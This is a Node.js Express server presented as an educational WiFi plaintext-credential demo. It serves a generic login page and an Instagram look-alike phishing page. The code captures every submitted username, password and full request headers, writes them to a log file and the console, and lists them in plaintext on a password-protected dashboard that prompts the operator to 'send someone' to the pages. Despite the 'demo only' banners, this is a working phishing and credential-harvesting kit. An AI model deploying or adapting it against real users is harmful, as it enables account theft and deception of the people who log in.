/**
 * airIsLeaking — Educational WiFi Packet-Sniffing Demo Server
 * ─────────────────────────────────────────────────────────────
 * Run with:  node server.js
 * Designed for Termux on Android (no root needed).
 *
 * Routes:
 *   GET  /                  → Demo login page (captures any credentials)
 *   POST /submit            → Capture handler → redirects to /chat
 *   GET  /chat              → LAN group chat (polling)
 *   GET  /instagram         → Instagram-style phishing clone
 *   POST /instagram-submit  → Capture handler → redirects to /chat
 *   GET  /admin             → Admin login gate
 *   POST /admin-login       → Admin auth
 *   GET  /admin/dashboard   → Captured credentials viewer (auth required)
 *   GET  /admin-logout      → Clear admin session
 */

'use strict';

const express = require('express');
const os      = require('os');
const fs      = require('fs');
const path    = require('path');
const crypto  = require('crypto');
const cfg     = require('./config');

const app      = express();
const PORT     = cfg.PORT;
const LOG_FILE = path.join(__dirname, 'captured.log');

// ════════════════════════════════════════════════════════════════════════════
// ── In-memory stores
// ════════════════════════════════════════════════════════════════════════════
const chatMessages  = [];   // { ts, ip, name, text }
const capturedCreds = [];   // { ts, ip, source, username, password, rawBody, headers }
const adminSessions = new Set(); // simple token-based sessions

// ════════════════════════════════════════════════════════════════════════════
// ── Middleware
// ════════════════════════════════════════════════════════════════════════════
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// ── Full request logger (the "this is what an attacker captures" view)
app.use((req, res, next) => {
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const line =
    `\n[${new Date().toISOString()}] ${req.method} ${req.url}  IP:${ip}\n` +
    `  Headers: ${JSON.stringify(req.headers)}\n` +
    `  Body:    ${JSON.stringify(req.body)}\n` +
    '─'.repeat(80) + '\n';
  fs.appendFile(LOG_FILE, line, () => {});
  next();
});

// ════════════════════════════════════════════════════════════════════════════
// ── Helpers
// ════════════════════════════════════════════════════════════════════════════
function getLanIP() {
  for (const ifaces of Object.values(os.networkInterfaces())) {
    for (const i of ifaces) {
      if (i.family === 'IPv4' && !i.internal) return i.address;
    }
  }
  return '0.0.0.0';
}

// HTML-escape for injecting values into HTML
function esc(str) {
  return String(str ?? '')
    .replace(/&/g, '&amp;').replace(/</g, '&lt;')
    .replace(/>/g, '&gt;').replace(/"/g, '&quot;');
}

// Capture helper — stores + logs any credential submission
function capture(req, source) {
  const ip       = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const ts       = new Date().toISOString();
  const username = String(req.body?.username ?? req.body?.email ?? '');
  const password = String(req.body?.password ?? '');
  const rawBody  = new URLSearchParams(req.body).toString();
  const headers  = JSON.stringify(req.headers, null, 2);

  const entry = { ts, ip, source, username, password, rawBody, headers };
  capturedCreds.push(entry);

  const line =
    `\n${'='.repeat(60)}\n` +
    `SOURCE:   ${source}\n` +
    `TIME:     ${ts}\n` +
    `IP:       ${ip}\n` +
    `USERNAME: ${username}\n` +
    `PASSWORD: ${password}\n` +
    `RAW BODY: ${rawBody}\n` +
    `HEADERS:\n${headers}\n` +
    '='.repeat(60) + '\n';
  fs.appendFile(LOG_FILE, line, () => {});
  console.log(`[CAPTURED] ${source} | ${ts} | IP:${ip} | user:${username} | pass:${password}`);

  return entry;
}

// Simple cookie parser (no dependency)
function parseCookies(req) {
  const map = {};
  const header = req.headers.cookie || '';
  header.split(';').forEach(c => {
    const [k, ...v] = c.trim().split('=');
    if (k) map[k.trim()] = decodeURIComponent(v.join('='));
  });
  return map;
}

// Admin auth middleware
function requireAdmin(req, res, next) {
  const cookies = parseCookies(req);
  if (adminSessions.has(cookies.adminToken)) return next();
  res.redirect('/admin');
}


// ════════════════════════════════════════════════════════════════════════════
//
//  PAGE TEMPLATES (shared CSS tokens)
//
// ════════════════════════════════════════════════════════════════════════════

// ── Shared: demo warning banner HTML
const DEMO_BANNER = `
  <div class="demo-banner">
    <span class="label">⚠ DEMO ONLY ⚠</span>
    Security demonstration — do <u>not</u> enter real passwords.<br>
    <em>Type anything to see how plaintext credentials are captured.</em>
  </div>`;


// ════════════════════════════════════════════════════════════════════════════
// ROUTE: GET /  — Generic demo login (root landing page)
// ════════════════════════════════════════════════════════════════════════════
app.get('/', (req, res) => {
  res.send(`<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Sign In — airIsLeaking Demo</title>
<style>
  * { box-sizing:border-box; margin:0; padding:0; }
  body {
    font-family: Arial, Helvetica, sans-serif;
    background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    padding: 20px;
  }
  .card {
    background: #fff;
    border-radius: 10px;
    box-shadow: 0 8px 32px rgba(0,0,0,.4);
    width: 100%;
    max-width: 380px;
    padding: 36px 32px 28px;
  }
  .logo {
    text-align: center;
    margin-bottom: 8px;
    font-size: 1.5rem;
    font-weight: 800;
    color: #0f3460;
    letter-spacing: -0.5px;
  }
  .tagline { text-align:center; font-size:0.78rem; color:#888; margin-bottom:24px; }
  .demo-banner {
    background: #fff8e1;
    border: 2px solid #c0392b;
    border-radius: 6px;
    padding: 12px 14px;
    margin-bottom: 22px;
    text-align: center;
    font-size: 0.8rem;
    font-weight: 700;
    color: #c0392b;
    line-height: 1.6;
    text-transform: uppercase;
  }
  .demo-banner .label { display:block; font-size:1rem; margin-bottom:4px; }
  .field { margin-bottom: 16px; }
  .field label { display:block; font-size:0.8rem; color:#555; margin-bottom:5px; font-weight:600; }
  .field input {
    width: 100%;
    padding: 11px 14px;
    border: 1.5px solid #ddd;
    border-radius: 6px;
    font-size: 0.95rem;
    color: #222;
    outline: none;
    transition: border-color .2s, box-shadow .2s;
  }
  .field input:focus { border-color: #0f3460; box-shadow: 0 0 0 3px rgba(15,52,96,.12); }
  button[type=submit] {
    width: 100%;
    padding: 13px;
    background: #0f3460;
    color: #fff;
    border: none;
    border-radius: 6px;
    font-size: 1rem;
    font-weight: 700;
    cursor: pointer;
    letter-spacing: 0.3px;
    transition: background .2s;
    margin-top: 4px;
  }
  button[type=submit]:hover { background: #1a4a80; }
  .links { margin-top: 18px; text-align: center; font-size: 0.82rem; color: #888; }
  .links a { color: #0f3460; text-decoration: none; }
  .links a:hover { text-decoration: underline; }
  .http-note {
    margin-top: 18px;
    text-align: center;
    font-size: 0.68rem;
    color: #c0392b;
    font-weight: bold;
    letter-spacing: 0.3px;
  }
  .nav { margin-top: 20px; display: flex; gap: 10px; justify-content: center; flex-wrap: wrap; }
  .nav a {
    font-size: 0.72rem;
    padding: 5px 12px;
    border: 1px solid rgba(255,255,255,.25);
    border-radius: 20px;
    color: rgba(255,255,255,.7);
    text-decoration: none;
    transition: background .2s;
  }
  .nav a:hover { background: rgba(255,255,255,.1); }
</style>
</head>
<body>
<div class="card">
  <div class="logo">🔐 SecurePortal</div>
  <div class="tagline">Sign in to continue</div>
  ${DEMO_BANNER}
  <form method="POST" action="/submit">
    <div class="field">
      <label for="username">Email or Username</label>
      <input type="text" id="username" name="username" placeholder="you@example.com" autocomplete="off">
    </div>
    <div class="field">
      <label for="password">Password</label>
      <input type="password" id="password" name="password" placeholder="Enter any text">
    </div>
    <button type="submit">Sign In</button>
  </form>
  <div class="links">
    <a href="#">Forgot password?</a> &nbsp;·&nbsp; <a href="#">Create account</a>
  </div>
  <div class="http-note">⚠ Plain HTTP — credentials travel unencrypted</div>
</div>
<div class="nav">
  <a href="/instagram">Instagram Demo</a>
  <a href="/chat">LAN Chat</a>
  <a href="/admin">Admin</a>
</div>
</body>
</html>`);
});


// ════════════════════════════════════════════════════════════════════════════
// ROUTE: POST /submit  — capture from root login → redirect to chat
// ════════════════════════════════════════════════════════════════════════════
app.post('/submit', (req, res) => {
  capture(req, 'root-login');
  res.redirect('/chat');
});


// ════════════════════════════════════════════════════════════════════════════
// ROUTE: GET /chat  — LAN group chat
// ════════════════════════════════════════════════════════════════════════════
app.get('/chat', (req, res) => {
  res.send(`<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>LAN Chat — airIsLeaking</title>
<style>
  * { box-sizing:border-box; margin:0; padding:0; }
  body {
    font-family: 'Courier New', monospace;
    background: #0d1117;
    color: #c9d1d9;
    height: 100vh;
    display: flex;
    flex-direction: column;
    overflow: hidden;
  }
  header {
    background: #161b22;
    border-bottom: 2px solid #00ff88;
    padding: 10px 18px;
    display: flex;
    align-items: center;
    gap: 10px;
    flex-shrink: 0;
  }
  .dot {
    width: 9px; height: 9px;
    background: #00ff88;
    border-radius: 50%;
    box-shadow: 0 0 8px #00ff88;
    animation: blink 1.2s ease-in-out infinite;
    flex-shrink: 0;
  }
  @keyframes blink { 0%,100%{opacity:1} 50%{opacity:.2} }
  header h1 { font-size: 1rem; color: #00ff88; letter-spacing: 2px; }
  header .sub { font-size: 0.65rem; color: #8b949e; margin-top: 1px; }
  .notice {
    background: #1c2128;
    border-left: 4px solid #ffcc00;
    padding: 8px 16px;
    font-size: 0.73rem;
    color: #e3b341;
    flex-shrink: 0;
  }
  #messages {
    flex: 1;
    overflow-y: auto;
    padding: 14px 18px;
    display: flex;
    flex-direction: column;
    gap: 8px;
  }
  .msg {
    background: #161b22;
    border: 1px solid #21262d;
    border-radius: 6px;
    padding: 8px 14px;
  }
  .msg .meta { font-size: 0.65rem; color: #8b949e; margin-bottom: 3px; }
  .msg .meta .name { color: #58a6ff; font-weight: bold; }
  .msg .meta .ip { color: #3fb950; }
  .msg .text { font-size: 0.88rem; color: #e6edf3; word-break: break-word; }
  .empty { color: #3d444d; font-size: 0.82rem; text-align: center; margin-top: 30px; }
  footer {
    background: #161b22;
    border-top: 1px solid #30363d;
    padding: 12px 18px;
    display: flex;
    gap: 8px;
    flex-shrink: 0;
  }
  footer input {
    flex: 1;
    background: #0d1117;
    border: 1.5px solid #30363d;
    border-radius: 6px;
    color: #c9d1d9;
    padding: 9px 13px;
    font-family: inherit;
    font-size: 0.88rem;
    outline: none;
    transition: border-color .2s;
  }
  footer input:focus { border-color: #00ff88; }
  #nameInput { max-width: 120px; }
  footer button {
    background: #238636;
    border: none;
    border-radius: 6px;
    color: #fff;
    padding: 9px 18px;
    font-family: inherit;
    font-size: 0.88rem;
    cursor: pointer;
    transition: background .2s;
    white-space: nowrap;
  }
  footer button:hover { background: #2ea043; }
</style>
</head>
<body>
<header>
  <div class="dot"></div>
  <div>
    <h1>// LAN CHAT</h1>
    <div class="sub">airIsLeaking demo — traffic is unencrypted HTTP</div>
  </div>
</header>
<div class="notice">
  ⚠ Every message is sent as plaintext over the local network and can be captured by anyone on this WiFi.
</div>
<div id="messages"><p class="empty">No messages yet — say something!</p></div>
<footer>
  <input type="text" id="nameInput" placeholder="Your name" maxlength="30" autocomplete="off" value="anon">
  <input type="text" id="msgInput"  placeholder="Type a message…" maxlength="300" autocomplete="off">
  <button onclick="sendMsg()">Send</button>
</footer>
<script>
  let lastCount = 0;

  async function poll() {
    try {
      const r = await fetch('/api/messages');
      const data = await r.json();
      if (data.length !== lastCount) { lastCount = data.length; render(data); }
    } catch(e) {}
    setTimeout(poll, 2000);
  }

  function render(msgs) {
    const box = document.getElementById('messages');
    if (!msgs.length) { box.innerHTML = '<p class="empty">No messages yet — say something!</p>'; return; }
    box.innerHTML = msgs.map(m =>
      '<div class="msg">' +
        '<div class="meta">' +
          '<span class="name">' + h(m.name) + '</span>' +
          ' <span class="ip">(' + h(m.ip) + ')</span>' +
          ' · ' + h(m.ts) +
        '</div>' +
        '<div class="text">' + h(m.text) + '</div>' +
      '</div>'
    ).join('');
    box.scrollTop = box.scrollHeight;
  }

  async function sendMsg() {
    const nameEl = document.getElementById('nameInput');
    const msgEl  = document.getElementById('msgInput');
    const text   = msgEl.value.trim();
    const name   = nameEl.value.trim() || 'anon';
    if (!text) return;
    msgEl.value = '';
    try {
      await fetch('/api/messages', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ text, name })
      });
    } catch(e) {}
  }

  document.getElementById('msgInput').addEventListener('keydown', e => {
    if (e.key === 'Enter') sendMsg();
  });

  function h(s) {
    return String(s ?? '')
      .replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
  }

  poll();
</script>
</body>
</html>`);
});


// ════════════════════════════════════════════════════════════════════════════
// ── Chat API
// ════════════════════════════════════════════════════════════════════════════
app.get('/api/messages', (req, res) => res.json(chatMessages));

app.post('/api/messages', (req, res) => {
  const text = String(req.body?.text ?? '').trim().slice(0, 300);
  if (!text) return res.status(400).json({ error: 'empty' });
  const ip   = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const name = String(req.body?.name ?? 'anon').trim().slice(0, 30) || 'anon';
  chatMessages.push({ ts: new Date().toISOString(), ip, name, text });
  res.json({ ok: true });
});


// ════════════════════════════════════════════════════════════════════════════
// ROUTE: GET /instagram  — Instagram-style phishing clone
// ════════════════════════════════════════════════════════════════════════════
app.get('/instagram', (req, res) => {
  res.send(`<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Instragram — Log In</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Pacifico&display=swap');
  * { box-sizing:border-box; margin:0; padding:0; }
  body {
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
    background: #fafafa;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    padding: 20px;
  }
  .demo-banner {
    background: #fff3cd;
    border: 2.5px solid #c0392b;
    border-radius: 8px;
    padding: 10px 16px;
    margin-bottom: 18px;
    text-align: center;
    font-size: 0.78rem;
    font-weight: 700;
    color: #c0392b;
    line-height: 1.6;
    text-transform: uppercase;
    width: 100%;
    max-width: 350px;
  }
  .demo-banner .label { display:block; font-size:0.9rem; margin-bottom:3px; }
  .card {
    background: #fff;
    border: 1px solid #dbdbdb;
    border-radius: 3px;
    padding: 40px 40px 30px;
    width: 100%;
    max-width: 350px;
    text-align: center;
  }
  .logo {
    font-family: 'Pacifico', cursive, 'Billabong', serif;
    font-size: 2.4rem;
    color: #262626;
    margin-bottom: 22px;
    letter-spacing: -1px;
  }
  .logo span { color: #e1306c; }
  input[type=text], input[type=password] {
    width: 100%;
    padding: 9px 10px;
    background: #fafafa;
    border: 1px solid #dbdbdb;
    border-radius: 3px;
    font-size: 0.85rem;
    color: #262626;
    margin-bottom: 8px;
    outline: none;
    transition: border-color .15s;
    text-align: left;
  }
  input[type=text]:focus, input[type=password]:focus { border-color: #a8a8a8; }
  button[type=submit] {
    width: 100%;
    padding: 8px;
    background: #0095f6;
    color: #fff;
    border: none;
    border-radius: 8px;
    font-size: 0.9rem;
    font-weight: 700;
    cursor: pointer;
    margin-top: 4px;
    transition: opacity .2s;
  }
  button[type=submit]:hover { opacity: 0.85; }
  .or-divider {
    display: flex;
    align-items: center;
    gap: 14px;
    margin: 18px 0;
    font-size: 0.78rem;
    color: #8e8e8e;
    font-weight: 600;
    text-transform: uppercase;
  }
  .or-divider::before, .or-divider::after {
    content: '';
    flex: 1;
    height: 1px;
    background: #dbdbdb;
  }
  .fb-btn {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 8px;
    font-size: 0.88rem;
    font-weight: 600;
    color: #385185;
    cursor: pointer;
    background: none;
    border: none;
    width: 100%;
  }
  .forgot { display:block; margin-top:14px; font-size:0.78rem; color:#00376b; text-decoration:none; }
  .forgot:hover { text-decoration: underline; }
  .card2 {
    background: #fff;
    border: 1px solid #dbdbdb;
    border-radius: 3px;
    padding: 16px;
    width: 100%;
    max-width: 350px;
    text-align: center;
    margin-top: 10px;
    font-size: 0.88rem;
    color: #262626;
  }
  .card2 a { color: #0095f6; font-weight: 600; text-decoration: none; }
  .app-links { margin-top: 24px; text-align: center; }
  .app-links p { font-size: 0.8rem; color: #262626; margin-bottom: 10px; }
  .app-links img { height: 36px; margin: 0 4px; border-radius: 6px; }
  .http-note {
    margin-top: 14px;
    font-size: 0.67rem;
    color: #c0392b;
    font-weight: bold;
    text-align: center;
  }
</style>
</head>
<body>

${DEMO_BANNER}

<div class="card">
  <div class="logo">Inst<span>a</span>gram</div>

  <form method="POST" action="/instagram-submit">
    <input type="text" name="username" placeholder="Phone number, username, or email" autocomplete="off">
    <input type="password" name="password" placeholder="Password">
    <button type="submit">Log in</button>
  </form>

  <div class="or-divider">OR</div>
  <button class="fb-btn">
    <svg width="18" height="18" viewBox="0 0 24 24" fill="#385185"><path d="M24 12.073C24 5.405 18.627 0 12 0S0 5.405 0 12.073C0 18.1 4.388 23.094 10.125 24v-8.437H7.078V12.07h3.047V9.41c0-3.025 1.791-4.697 4.533-4.697 1.312 0 2.686.236 2.686.236v2.97h-1.513c-1.491 0-1.956.93-1.956 1.886v2.267h3.328l-.532 3.492h-2.796V24C19.612 23.094 24 18.1 24 12.073z"/></svg>
    Log in with Facebook
  </button>

  <a class="forgot" href="#">Forgot password?</a>
  <div class="http-note">⚠ Plain HTTP — password sent unencrypted over the wire</div>
</div>

<div class="card2">
  Don't have an account? <a href="#">Sign up</a>
</div>

</body>
</html>`);
});


// ════════════════════════════════════════════════════════════════════════════
// ROUTE: POST /instagram-submit  — capture → redirect to chat
// ════════════════════════════════════════════════════════════════════════════
app.post('/instagram-submit', (req, res) => {
  capture(req, 'instagram-clone');
  res.redirect('/chat');
});


// ════════════════════════════════════════════════════════════════════════════
// ROUTE: GET /login  — kept for backward compat, now shows same as /
// ════════════════════════════════════════════════════════════════════════════
app.get('/login', (req, res) => res.redirect('/'));


// ════════════════════════════════════════════════════════════════════════════
// ROUTE: POST /login-submit  — kept for backward compat
// ════════════════════════════════════════════════════════════════════════════
app.post('/login-submit', (req, res) => {
  capture(req, 'legacy-login');
  res.redirect('/chat');
});


// ════════════════════════════════════════════════════════════════════════════
// ADMIN — Login gate
// ════════════════════════════════════════════════════════════════════════════
app.get('/admin', (req, res) => {
  // If already authed, go to dashboard
  const cookies = parseCookies(req);
  if (adminSessions.has(cookies.adminToken)) return res.redirect('/admin/dashboard');

  const err = req.query.err ? '<div class="err">Invalid credentials. Try again.</div>' : '';
  res.send(`<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Admin Login — airIsLeaking</title>
<style>
  * { box-sizing:border-box; margin:0; padding:0; }
  body {
    font-family: 'Courier New', monospace;
    background: #10001a;
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
  }
  .card {
    background: #1a0a2e;
    border: 1px solid #4b2e6b;
    border-radius: 10px;
    padding: 40px 36px;
    width: 340px;
    box-shadow: 0 8px 40px rgba(0,0,0,.5);
  }
  h2 { color: #c678dd; font-size: 1.1rem; letter-spacing: 2px; margin-bottom: 6px; }
  .sub { color: #5c4475; font-size: 0.72rem; margin-bottom: 28px; }
  label { display:block; font-size:0.75rem; color:#8b6aaa; margin-bottom:5px; margin-top:14px; }
  input[type=text], input[type=password] {
    width: 100%;
    padding: 10px 13px;
    background: #0d001a;
    border: 1px solid #3d1f5a;
    border-radius: 5px;
    color: #e0d0ff;
    font-family: inherit;
    font-size: 0.9rem;
    outline: none;
    transition: border-color .2s;
  }
  input:focus { border-color: #c678dd; }
  button {
    margin-top: 22px;
    width: 100%;
    padding: 11px;
    background: #c678dd;
    border: none;
    border-radius: 5px;
    color: #10001a;
    font-family: inherit;
    font-size: 0.95rem;
    font-weight: 700;
    cursor: pointer;
    letter-spacing: 1px;
    transition: background .2s;
  }
  button:hover { background: #d491ee; }
  .err {
    background: #3a0a0a;
    border: 1px solid #c0392b;
    border-radius: 5px;
    color: #e74c3c;
    font-size: 0.78rem;
    padding: 9px 12px;
    margin-bottom: 10px;
  }
</style>
</head>
<body>
<div class="card">
  <h2>// ADMIN ACCESS</h2>
  <p class="sub">airIsLeaking demo — restricted panel</p>
  ${err}
  <form method="POST" action="/admin-login">
    <label>Username</label>
    <input type="text" name="username" autocomplete="off" placeholder="admin">
    <label>Password</label>
    <input type="password" name="password" placeholder="••••••••">
    <button type="submit">ENTER →</button>
  </form>
</div>
</body>
</html>`);
});

app.post('/admin-login', (req, res) => {
  const { username, password } = req.body;
  if (username === cfg.ADMIN_USERNAME && password === cfg.ADMIN_PASSWORD) {
    const token = crypto.randomBytes(24).toString('hex');
    adminSessions.add(token);
    res.setHeader('Set-Cookie', `adminToken=${token}; Path=/; HttpOnly`);
    res.redirect('/admin/dashboard');
  } else {
    res.redirect('/admin?err=1');
  }
});

app.get('/admin-logout', (req, res) => {
  const cookies = parseCookies(req);
  adminSessions.delete(cookies.adminToken);
  res.setHeader('Set-Cookie', 'adminToken=; Path=/; Max-Age=0');
  res.redirect('/admin');
});


// ════════════════════════════════════════════════════════════════════════════
// ROUTE: GET /admin/dashboard  — Captured credentials viewer (auth required)
// ════════════════════════════════════════════════════════════════════════════
app.get('/admin/dashboard', requireAdmin, (req, res) => {
  const rows = capturedCreds.map((e, i) => `
    <tr>
      <td>${i + 1}</td>
      <td class="ts">${esc(e.ts)}</td>
      <td><span class="src src-${esc(e.source)}">${esc(e.source)}</span></td>
      <td><code class="ip">${esc(e.ip)}</code></td>
      <td><strong>${esc(e.username)}</strong></td>
      <td><strong class="pass">${esc(e.password)}</strong></td>
      <td><details><summary>view</summary><pre>${esc(e.rawBody)}</pre></details></td>
      <td><details><summary>view</summary><pre>${esc(e.headers)}</pre></details></td>
    </tr>`).join('');

  const uniqueIPs    = new Set(capturedCreds.map(e => e.ip)).size;
  const instaCounts  = capturedCreds.filter(e => e.source === 'instagram-clone').length;
  const rootCounts   = capturedCreds.filter(e => e.source === 'root-login').length;

  res.send(`<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Admin Dashboard — airIsLeaking</title>
<style>
  * { box-sizing:border-box; margin:0; padding:0; }
  body {
    font-family: 'Courier New', monospace;
    background: #0d0015;
    color: #d4b8ff;
    min-height: 100vh;
    padding: 24px 20px;
  }
  .topbar {
    display: flex;
    align-items: baseline;
    justify-content: space-between;
    margin-bottom: 6px;
    flex-wrap: wrap;
    gap: 10px;
  }
  h1 { color: #c678dd; font-size: 1.2rem; letter-spacing: 2px; }
  .sub { color: #5c4475; font-size: 0.72rem; margin-bottom: 22px; }
  .actions { display:flex; gap:10px; align-items:center; flex-wrap:wrap; }
  .btn {
    background: #c678dd;
    border: none;
    border-radius: 4px;
    color: #0d0015;
    padding: 6px 16px;
    font-family: inherit;
    font-size: 0.78rem;
    cursor: pointer;
    font-weight: bold;
    text-decoration: none;
    display: inline-block;
    transition: background .2s;
  }
  .btn:hover { background: #d491ee; }
  .btn.secondary {
    background: transparent;
    border: 1px solid #4b2e6b;
    color: #8b6aaa;
  }
  .btn.secondary:hover { border-color: #c678dd; color: #c678dd; }
  .stats { display:flex; gap:14px; margin-bottom:22px; flex-wrap:wrap; }
  .stat {
    background: #1a0a2e;
    border: 1px solid #3d1f5a;
    border-radius: 8px;
    padding: 14px 20px;
    min-width: 130px;
  }
  .stat .num { font-size: 1.8rem; color: #c678dd; font-weight: bold; }
  .stat .lbl { font-size: 0.7rem; color: #5c4475; margin-top: 2px; }
  .tbl-wrap { overflow-x: auto; }
  table { width:100%; border-collapse:collapse; font-size:0.75rem; min-width: 800px; }
  th {
    background: #1a0a2e;
    color: #c678dd;
    padding: 10px 12px;
    text-align: left;
    border-bottom: 2px solid #3d1f5a;
    white-space: nowrap;
  }
  td { padding:8px 12px; border-bottom:1px solid #200a35; vertical-align:top; }
  tr:nth-child(even) td { background: #13002a; }
  tr:hover td { background: #1a0a2e; }
  .ts { font-size: 0.68rem; color: #7a5a9a; white-space: nowrap; }
  code.ip { color: #56b6c2; }
  .pass { color: #e06c75; }
  .src { font-size: 0.68rem; padding: 2px 6px; border-radius: 3px; }
  .src-root-login { background:#1a3a1a; color:#3fb950; }
  .src-instagram-clone { background:#3a1a2a; color:#e06c75; }
  .src-legacy-login { background:#2a2a1a; color:#e3b341; }
  pre {
    background: #060010;
    border: 1px solid #200a35;
    border-radius: 4px;
    padding: 8px;
    max-width: 380px;
    overflow-x: auto;
    white-space: pre-wrap;
    font-size: 0.68rem;
    margin-top: 6px;
    color: #9b8abf;
  }
  details summary { cursor:pointer; color:#61afef; font-size:0.72rem; }
  details summary:hover { text-decoration:underline; }
  .empty { text-align:center; padding:60px 0; color:#3d1f5a; }
  .logpath { margin-top:18px; font-size:0.7rem; color:#3d1f5a; }
  .logpath code { color:#5c4475; }
</style>
</head>
<body>
<div class="topbar">
  <div>
    <h1>// ADMIN DASHBOARD</h1>
  </div>
  <div class="actions">
    <button class="btn" onclick="location.reload()">↻ Refresh</button>
    <a href="/admin-logout" class="btn secondary">Logout</a>
  </div>
</div>
<p class="sub">airIsLeaking demo — educational use only</p>

<div class="stats">
  <div class="stat">
    <div class="num">${capturedCreds.length}</div>
    <div class="lbl">credentials captured</div>
  </div>
  <div class="stat">
    <div class="num">${uniqueIPs}</div>
    <div class="lbl">unique IPs</div>
  </div>
  <div class="stat">
    <div class="num">${instaCounts}</div>
    <div class="lbl">via instagram clone</div>
  </div>
  <div class="stat">
    <div class="num">${rootCounts}</div>
    <div class="lbl">via root login</div>
  </div>
  <div class="stat">
    <div class="num">${chatMessages.length}</div>
    <div class="lbl">chat messages</div>
  </div>
</div>

${capturedCreds.length === 0
  ? '<div class="empty">No credentials captured yet.<br>Send someone to <code>/</code> or <code>/instagram</code></div>'
  : `<div class="tbl-wrap"><table>
  <thead><tr>
    <th>#</th><th>Timestamp</th><th>Source</th><th>IP</th>
    <th>Username / Email</th><th>Password (PLAIN)</th><th>Raw Body</th><th>HTTP Headers</th>
  </tr></thead>
  <tbody>${rows}</tbody>
</table></div>`}

<div class="logpath">Persistent log: <code>captured.log</code> (next to server.js)</div>
</body>
</html>`);
});


// ════════════════════════════════════════════════════════════════════════════
// ── Start server
// ════════════════════════════════════════════════════════════════════════════
app.listen(PORT, '0.0.0.0', () => {
  const ip = getLanIP();
  console.log('');
  console.log('╔══════════════════════════════════════════════════════╗');
  console.log('║         airIsLeaking — Demo Server Ready             ║');
  console.log('╠══════════════════════════════════════════════════════╣');
  console.log(`║  LAN  ➜  http://${ip.padEnd(15)}:${PORT}             ║`);
  console.log(`║  Local➜  http://127.0.0.1:${PORT}                     ║`);
  console.log('╠══════════════════════════════════════════════════════╣');
  console.log('║  /              → Demo login (root landing)          ║');
  console.log('║  /instagram     → Instagram-style clone              ║');
  console.log('║  /chat          → LAN group chat                     ║');
  console.log('║  /admin         → Admin login                        ║');
  console.log('║  /admin/dashboard → Captured data (auth required)    ║');
  console.log('╠══════════════════════════════════════════════════════╣');
  console.log(`║  Admin user: ${cfg.ADMIN_USERNAME.padEnd(38)}║`);
  console.log(`║  Admin pass: ${cfg.ADMIN_PASSWORD.padEnd(38)}║`);
  console.log('╠══════════════════════════════════════════════════════╣');
  console.log('║  Log file:  captured.log                             ║');
  console.log('╚══════════════════════════════════════════════════════╝');
  console.log('');
  console.log(`  ➜ Tell attendees:  http://${ip}:${PORT}`);
  console.log('');
});
